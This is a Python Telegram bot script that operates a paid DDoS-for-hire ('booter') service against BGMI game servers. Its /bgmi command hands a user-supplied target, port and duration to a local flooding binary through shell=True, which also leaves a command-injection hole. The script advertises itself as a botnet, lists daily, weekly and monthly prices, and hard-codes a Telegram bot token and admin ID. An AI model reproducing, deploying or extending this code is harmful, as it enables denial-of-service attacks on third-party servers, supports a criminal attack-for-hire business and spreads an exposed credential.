#!/usr/bin/python3
#By OPPANDAMODS

import telebot
import subprocess
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('6375257731:AAHawkSSWgBKamKq9yYED9fXjdX5pJ4guT4')

# Admin user IDs
admin_id = ["1151701003"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []


# List to store allowed user IDs
allowed_user_ids = read_users()


# Function to log command to the file
def log_command(user_id, target, port, time):
    try:
        user_info = bot.get_chat(user_id)
        if user_info.username:
            username = "@" + user_info.username
        else:
            username = f"UserID: {user_id}"
    except Exception:
        username = f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response


# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")


@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)


@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for uid in allowed_user_ids:
                        file.write(f"{uid}\n")
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = '''Please Specify A User ID to Remove.
 Usage: /remove <userid>'''
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully"
        except FileNotFoundError:
            response = "Logs are already cleared."
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)


@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for uid in user_ids:
                        try:
                            user_info = bot.get_chat(int(uid))
                            username = user_info.username
                            response += f"- @{username} (ID: {uid})\n"
                        except Exception:
                            response += f"- User ID: {uid}\n"
                else:
                    response = "No data found"
        except FileNotFoundError:
            response = "No data found"
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                bot.reply_to(message, "No data found.")
        else:
            bot.reply_to(message, "No data found")
    else:
        bot.reply_to(message, "Only Admin Can Run This Command.")


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    bot.reply_to(message, f"Your ID: {user_id}")


# Reply when attack starts
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    response = (
        f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n"
        f"𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n"
        f"𝐏𝐨𝐫𝐭: {port}\n"
        f"𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n"
        f"𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n"
        f"By OPPANDAMODS"
    )
    bot.reply_to(message, response)


# Cooldown store
bgmi_cooldown = {}
COOLDOWN_TIME = 300  # 5 minutes


@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "You Are Not Authorized To Use This Command.\nBy OPPANDAMODS")
        return

    # Cooldown check (admins bypass)
    if user_id not in admin_id:
        if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
            bot.reply_to(message, "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again.")
            return
        bgmi_cooldown[user_id] = datetime.datetime.now()

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "Usage :- /bgmi <target> <port> <time>\nBy OPPANDAMODS")
        return

    try:
        target = command[1]
        port = int(command[2])
        time = int(command[3])
    except ValueError:
        bot.reply_to(message, "Invalid port or time. Both must be numbers.")
        return

    if time > 5000:
        bot.reply_to(message, "Error: Time interval must be less than 5000.")
        return

    if time <= 0 or port <= 0 or port > 65535:
        bot.reply_to(message, "Invalid port or time value.")
        return

    # Logs
    record_command_logs(user_id, '/bgmi', target, port, time)
    log_command(user_id, target, port, time)

    # Attack start reply
    start_attack_reply(message, target, port, time)

    # Full command
    full_command = f"./OPPANDA {target} {port} {time} 500"

    try:
        # FIX: Popen = non-blocking, attack background mein chalta hai
        process = subprocess.Popen(
            full_command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        # Optional: 2 sec wait karke check karo ki process start hua ya turant crash hua
        try:
            outs, errs = process.communicate(timeout=2)
            # Agar 2 sec ke andar hi exit ho gaya → problem hai
            if process.returncode != 0:
                err_text = errs.decode(errors="ignore") if errs else "Unknown error"
                bot.reply_to(message, f"Attack failed to start:\n{err_text}")
                return
        except subprocess.TimeoutExpired:
            # 2 sec baad bhi chal raha hai → sahi hai, background mein chalne do
            pass

    except Exception as e:
        bot.reply_to(message, f"Error starting attack: {e}")
        return


@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No Command Logs Found For You."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''Available commands:
 /bgmi : Method For Bgmi Servers.
 /rules : Please Check Before Use !!.
 /mylogs : To Check Your Recents Attacks.
 /plan : Checkout Our Botnet Rates.

 To See Admin Commands:
 /admincmd : Shows All Admin Commands.
 By OPPANDAMODS
'''
    bot.reply_to(message, help_text)


@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = (
        f"Welcome to Your Home, {user_name}! Feel Free to Explore.\n"
        f"Try To Run This Command : /help\n"
        f"Welcome To The World's Best Ddos Bot\n"
        f"By OPPANDAMODS"
    )
    bot.reply_to(message, response)


@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
By OPPANDAMODS'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip :
-> Attack Time : 200 (S)
> After Attack Limit : 2 Min
-> Concurrents Attack : 300

Pr-ice List:
Day-->150 Rs
Week-->900 Rs
Month-->1600 Rs
By OPPANDAMODS
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['admincmd'])
def welcome_admincmd(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

/add <userId> : Add a User.
/remove <userid> Remove a User.
/allusers : Authorised Users Lists.
/logs : All Users Logs.
/broadcast : Broadcast a Message.
/clearlogs : Clear The Logs File.
By OPPANDAMODS
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for uid in user_ids:
                    try:
                        bot.send_message(uid, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {uid}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users."
        else:
            response = "Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)


print("Bot started... By OPPANDAMODS")
bot.polling(none_stop=True)
#By OPPANDAMODS